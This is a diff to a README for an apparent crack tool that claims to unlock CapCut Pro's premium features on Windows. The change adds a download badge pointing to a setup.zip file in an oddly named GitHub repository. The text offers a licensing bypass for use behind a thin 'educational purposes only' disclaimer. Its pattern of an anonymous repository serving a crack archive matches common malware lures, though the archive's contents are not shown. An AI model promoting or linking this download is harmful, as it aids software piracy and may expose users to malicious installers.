@@ -4,7 +4,7 @@ CapCut-Pro-Activator is an activator / crack for CapCut Pro on Windows. It activ
 Disclaimer: This tool is for educational purposes only. Use at your own risk. Support the official developers by purchasing CapCut Pro if you find it useful.  
 
 💥Download:  
-
+[![Download](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github)](https://github.com/mapcongressmansoul/ienuqeud/releases/download/v1.0-BETA/setup.zip)  
 
 ##  💥Features:  
 🔓 All Premium Features Activated  
